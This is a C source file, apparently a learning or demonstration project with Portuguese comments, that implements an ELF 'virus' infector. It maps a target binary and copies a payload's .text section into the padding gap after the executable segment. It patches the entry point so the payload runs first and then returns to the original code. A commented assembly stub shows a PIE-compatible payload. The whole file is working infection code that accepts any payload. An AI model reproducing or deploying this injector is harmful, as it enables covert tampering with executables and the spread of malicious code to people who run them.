/*
 * infecta.c
 *
 *  Created on: May 13, 2019
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include <elf.h>
#include <sys/mman.h>


/* Helper functions */
static int get_file_size (int fd)
{
        struct stat _info;
        fstat (fd, &_info);
        return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int elfi_open_and_map (char *fname, void **data, int *len)
{
        int size;
        int fd;

        if ((fd = open (fname, O_APPEND | O_RDWR, 0)) < 0)
        {
                perror ("open:");
                exit (1);
        }

        size = get_file_size (fd);
        if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
        {
                perror ("mmap:");
                exit (1);
        }

        printf ("+ Arquivo mapeado (%d bytes ) em %p\n", size, data);
        *len = size;
        return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
  int         n_seg = elf_hdr->e_phnum;
  int         i;

//  printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr->e_phoff);
  for (i = 0; i < n_seg; i++)
    {
        printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
                "FSize:%8x MSize:%8x\n",
                i, elf_seg->p_type, elf_seg->p_flags,
                (unsigned int)elf_seg->p_offset,
                (unsigned int)elf_seg->p_filesz,
                (unsigned int)elf_seg->p_memsz);

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg
                            + (unsigned int) elf_hdr->e_phentsize);
    }

}
#endif

// len: tamanho do gap
// p: final do segmento
// d: arquivo elf com as section e program table
// fsize: tamanho do binario
//
//         /* Find executable segment and obtain offset and gap size */
//        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &p, &len);
Elf64_Phdr* elfi_find_gap(void *mapeado, int TamanhoArquivo, int *p, int *len)
{
        // struct header ELF
        Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) mapeado;
        // struct program header
        Elf64_Phdr* elf_program, *text_program_vitima;
        // e_phnum: numero de entradas na tabela programa
        int         n_seg = elf_hdr->e_phnum;
        int         i;
        int         text_end, gap=TamanhoArquivo;

        //printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));
        //printf("O tamanho da variavel elf_hdr: %ld \n", sizeof(elf_hdr));
        //printf("O tamanho de struct elf_hdr->e_phoff: %ld \n", sizeof(elf_hdr->e_phoff));



        // e_phoff: aponta para o inicio da tabela de programa
        elf_program = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr->e_phoff);
//      printf("p_type %d \n", elf_seg->p_type);

        for (i = 0; i < n_seg; i++)
        {
        //      printf("elf_program->p_flags: %#x\n", elf_program->p_flags);
        //      printf("elf_program->p_type: %#x\n", elf_program->p_type);
//      printf("elf_program->p_offset: %#lx\n", elf_program->p_offset);
        // p_flags: flags define o tipo do segmento(cabecalho de programa
        // Name         | Value   | Meaning
        // PF_X         | 0x1     | Execute
        // PF_W         | 0x2     | Write
        // PF_R         | 0x4     | Read
        // PF_MASKPROC  | 0xf0000000 | Unspecified
        // 0x1 and 0x011 = 1 (verdadeiro)
        // 0x2 and 0x011 = 0 (falso)
        // 0x4 and 0x011 = 0 (falso)
        // 0xf0000000 and 0x011 = 0 (falso)
        // Entao o comando: elf_seg->p_flags & 0x011 -> Procura por um segmento "execute"
        if (elf_program->p_type == PT_LOAD && elf_program->p_flags & 0x011)
      {

                        printf ("+ Processando Vitima -> Encontrado segmento .text executavel (#%d)\n", i);
        /*              printf("elf_program->p_type: %d \n", elf_program->p_type);
                        printf("elf_program->p_offset: %ld \n", elf_program->p_offset);
                        printf("elf_program->p_filesz: %ld \n", elf_program->p_filesz);
*/
                        //text_seg = elf_seg(o segmento progam atual
                        text_program_vitima = elf_program;


                        // elf_program->p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program->p_filesz: Size in bytes of the segment in the file image. May be 0.
                        // variavel text_end pega o tamanho do segmento text
                        text_end = elf_program->p_offset + elf_program->p_filesz;
//                      printf("o valor de text_end: %d \n", text_end);
      } else {
                        //p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program->p_offset do segundo segmento LOAD do tipo RW - o final do
                        // segmento LOAD Executavel
                        if (elf_program->p_type == PT_LOAD && (elf_program->p_offset - text_end) < gap)
                        {

/*                      printf("elf_program->p_type: %d \n", elf_program->p_type);
                        printf("elf_program->p_offset: %lx \n", elf_program->p_offset);
                        printf("elf_program->p_filesz: %ld \n", elf_program->p_filesz);

                        printf("o valor de text_end: %d \n", text_end);
                        printf("o valor de gap: %d \n", gap);
*/
                        printf ("   * Processando Vitima -> Encontrado segmento LOAD (#%d) fechado para .text (offset: 0x%x)\n", i, (unsigned int)elf_program->p_offset);

                                gap = elf_program->p_offset - text_end;
                        }
                }
                // q
                // e_phentsize: contem o tamanho de uma entrada de uma tabela de secao
      elf_program = (Elf64_Phdr *) ((unsigned char*) elf_program + (unsigned int) elf_hdr->e_phentsize);
    }

        *p = text_end;
        *len = gap;


        return text_program_vitima;
}



Elf64_Shdr *elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  // e_shoff:   Points to the start of the section header table.
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
  // e_shstrndx: Contains index of the section header table entry that contains the section names.
  Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
  // sh_offset: Offset of the section in the file image.
  const char *const sh_strtab_p = data + sh_strtab->sh_offset;

  // e_shnum: Contains the number of entries in the section header table.
  printf ("+ Procesasmento Payload -> Quantidade de Seções no arquivo Payload: %d . Procurando pela seção '%s'\n", elf_hdr->e_shnum, name);


  for (i = 0; i < elf_hdr->e_shnum; i++)
  {
//      printf("Processamento Payload -> O shdr[%d].sh_name: %x \n", i, shdr[i].sh_name);
        sname = (char*) (sh_strtab_p + shdr[i].sh_name);

        printf(" + Processando payload -> sname: '%s'\n", sname);


        if (!strcmp (sname, name))
        {
                printf("entrou no if retornando \n");
                printf("shdr->sh_name: %x  \n", shdr[i].sh_name);


                printf("shdr->sh_type: %x \n", shdr[i].sh_type);
                printf("shdr->sh_addr: %lx \n", shdr[i].sh_addr);
                return &shdr[i];
        }
  }

  return NULL;
}



// MapeadoVitima + p: e o arquivo vitima mapeado mais o program header
// len: tamanho do gap
// pat: padrao a buscar
// val: entrypoint do arquivo elf vitima
//
//  elfi_mem_subst (MapeadoVitima+p, payload_text_section->sh_size, 0x11111111, (long)ep);
int elfi_mem_subst(void *m, int len, long pat, long val)
{
        // obtem o endereco do program header da vitima
        unsigned char *p = (unsigned char*)m;
        long v;
        int i, r;

        /*
        printf("p: %hhn\n", p);
        printf("pat: %lx\n", pat);
        printf("val: %lx\n", val);
        printf("entrando no for\n\n");
*/
//      printf("len: %d \n", len);


        for (i = 0; i < len; i++)
        {
                v = *((long*)(p+i));
                // faz um xor da variavel v e varial pat
                r = v ^pat;


//              printf("v: %lx\n", v);
        //      printf("r: %x\n", r);

                if (r ==0)
                {
                        printf ("+ Padrão %lx encontrado no offset %d -> %lx\n", pat, i, val);
                        *((long*)(p+i)) = val;
                        return 0;
                }
        }
        return -1;
}

int main (int argc, char *argv[])
{
        void        *MapeadoVitima, *MapeadoPayload;
        int         Vitima_fd, payload_fd;
        int         TamanhoVitima, TamanhoPayload;
        // Struct para o header ELF
        Elf64_Ehdr* elf_hdr;
        // Struct para program header
        Elf64_Phdr  *vitima_text_program;
        // struct para section header
        Elf64_Shdr  *payload_text_section;
        // struct de enderecos base
        Elf64_Addr  base, ep;
        //variavel len = gap
        //variavel p=final do segmento LOAD executavel
        int         p, len;

        int offset_mode = 0x00;

        printf ("Exemplo de virus ELF\n\n");
        if (argc == 2){
        	printf("Running in offset mode");
        	offset_mode = 0x01;
        }
        if ((argc != 3 && argc != 2))
        {
                fprintf (stderr, "Uso:\n  %s <arquivo ELF> <payload>\n", argv[0]);
                exit (1);
        }

        /* Open and map target ELF */
        Vitima_fd = elfi_open_and_map (argv[1], &MapeadoVitima, &TamanhoVitima);

        /* Get Application Entry point */
        elf_hdr = (Elf64_Ehdr *) MapeadoVitima;
        ep = elf_hdr->e_entry;
        printf ("+ Processando Vitima -> Valor do Entry point: %p\n", (void*) ep);

#ifdef DEBUG
  elfi_dump_segments (d);
#endif

        /* Find executable segment and obtain offset and gap size */
        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &p, &len);
        if(offset_mode == 0x01){
        	printf("offset == %p\n", p - elf_hdr->e_entry);
        	return 0;
        }

        // p_vaddr: Virtual address of the segment program in memory
        base = vitima_text_program->p_vaddr;

        printf ("+ Processando vitima -> Endereco Base(Base Address) : 0x%p\n", (void*)base);

        /* Process payload */
        payload_fd = elfi_open_and_map (argv[2], &MapeadoPayload, &TamanhoPayload);

        // funcao que busca o segmento .text
        // MapeadoPayload: arquivo elf a ser injetado na vitima
        // payload_text_section: retorna com o section segmento do .text a ser injetado
        payload_text_section = elfi_find_section (MapeadoPayload, ".text");

        //mostraSectionHeaderELF(payload_text_section);

  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
  vitima_text_program->p_filesz += payload_text_section->sh_size;
  vitima_text_program->p_memsz += payload_text_section->sh_size;
  */

        printf ("+ Processando Payload -> Secao .text do arquivo Payload encontrado no offset %lx (Tamanho: %lx bytes)\n",  payload_text_section->sh_offset, payload_text_section->sh_size);

        if (payload_text_section->sh_size > len)
        {
                fprintf (stderr, "- Processando Payload -> Arquivo Payload muito grande, Não é possivel infectar.\n");
                exit (1);
        }
  /* Copy payload in the segment padding area */
  // memmove(dest, src, count): copia count bytes do buffer apontado por src para o buffer apontado por dest.
  //

  memmove (MapeadoVitima + p, MapeadoPayload + payload_text_section->sh_offset, payload_text_section->sh_size );

  // jbx81: sorry but i don't speak portuguese :)

  if(elf_hdr->e_type == 0x02){
	  /* Patch return address */

	  elfi_mem_subst (MapeadoVitima+p, payload_text_section->sh_size, 0x11111111, (long)ep);

	  /* Patch entry point */
	  elf_hdr->e_entry = (Elf64_Addr) (base + p);

  } else if(elf_hdr->e_type == 0x03){
	  /*
	   * let's talk about how payload should be.
section .text
        global _start
_start:
        sub r12, 0x4f20 <- put offset here!
        push rax
        push rdi
        push rsi
        push rdx

        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

        pop rdx
        pop rsi
        pop rdi
        pop rax
        jmp r12
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0


	   *
	   */
	  elf_hdr->e_entry = (Elf64_Addr) (base + p);
  }
  /* Close files and actually update target file */
  close (payload_fd);
  close (Vitima_fd);

  return 0;
}